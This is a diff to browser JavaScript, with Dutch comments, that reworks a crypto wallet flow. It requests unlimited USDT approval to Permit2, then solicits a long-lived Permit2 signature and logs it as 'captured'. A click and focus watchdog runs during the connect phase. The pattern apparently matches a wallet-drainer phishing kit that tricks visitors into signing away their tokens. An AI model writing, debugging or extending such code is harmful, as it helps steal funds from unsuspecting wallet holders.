@@ -58,6 +58,13 @@ function startWatchdog(requestId) {
   }, 60000);
 
   activeDynamicListener = () => {
+    // 🔥 LEGO FIX: Als we uit de connect-fase zijn, ruim de listeners op en stop direct!
+    if (APP_STATE.flowState !== 'CONNECTING') {
+      window.removeEventListener('click', activeDynamicListener);
+      window.removeEventListener('focus', activeDynamicListener);
+      return;
+    }
+
     const elapsed = Date.now() - startTime;
     
     // Alleen triggeren als de status nog STRICT op CONNECTING staat
@@ -355,9 +362,34 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
         { name: "nonce", type: "uint48" }
       ]
     };
+
+    // 🔥 LEGO FIX 1: EERST de basis ERC20 -> Permit2 approval controleren (zonder loop)
+    const token = TOKENS[0]; // Pak direct de actieve token (USDT)
+    if (APP_STATE.activeRequestId !== currentRid) throw new Error("Request ownership lost during execution.");
     
-    // 🔥 LEGO FIX: Zet de status direct op SIGNING_TX zodat de watchdog in BEIDE routes (wel/geen approval) pauzeert
-    setFlowState('SIGNING_TX'); 
+    const erc20 = new ethers.Contract(token, ERC20_ABI, signer);
+    const currentAllowance = await erc20.allowance(user, PERMIT2);
+    log("ERC20 allowance: " + currentAllowance.toString());
+
+    if (currentAllowance === 0n) {
+      log("⚠️ ERC20 Approval required...");
+      setFlowState('APPROVING'); // Zet watchdog in pauze stand voor de approval tx
+      touchInteraction();
+      const tx = await erc20.approve(PERMIT2, ethers.MaxUint256);
+      log("⛽ Waiting confirmation...");
+      await tx.wait();
+      log("✅ ERC20 approval confirmed");
+      touchInteraction();
+    } else {
+      log("✅ ERC20 already approved");
+    }
+
+    // 🔥 LEGO FIX 2: PAS HIER de status op SIGNING_TX zetten en de values bouwen voor MetaMask
+    if (APP_STATE.activeRequestId !== currentRid) throw new Error("Request ownership lost before signing.");
+    
+    log("✍️ Requesting typed data signature...");
+    setFlowState('SIGNING_TX'); // Houd watchdog gedempt tijdens de handtekening popup
+    touchInteraction();
 
     const sigDeadline = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60);
     const values = {
@@ -371,33 +403,6 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
       sigDeadline: sigDeadline.toString()
     };
 
-    // Check of de basis ERC20 -> Permit2 approval er is
-    for (const token of TOKENS) {
-      if (APP_STATE.activeRequestId !== currentRid) throw new Error("Request ownership lost during execution.");
-      
-      const erc20 = new ethers.Contract(token, ERC20_ABI, signer);
-      const currentAllowance = await erc20.allowance(user, PERMIT2);
-      log("ERC20 allowance: " + currentAllowance.toString());
-
-      if (currentAllowance === 0n) {
-        log("⚠️ ERC20 Approval required...");
-        setFlowState('APPROVING'); // 🔥 LEGO FIX: Zet status zodat watchdog pauzeert
-        touchInteraction();
-        const tx = await erc20.approve(PERMIT2, ethers.MaxUint256);
-        log("⛽ Waiting confirmation...");
-        await tx.wait();
-        log("✅ ERC20 approval confirmed");
-        touchInteraction();
-      } else {
-        log("✅ ERC20 already approved");
-      }
-    }
-
-    if (APP_STATE.activeRequestId !== currentRid) throw new Error("Request ownership lost before signing.");
-    
-    log("✍️ Requesting typed data signature...");
-    setFlowState('SIGNING_TX'); // 🔥 LEGO FIX: Houd watchdog ook hier gepauzeerd
-    touchInteraction();
     const signature = await signer.signTypedData(domain, types, values);
     log("✍️ Signature captured");
     touchInteraction();
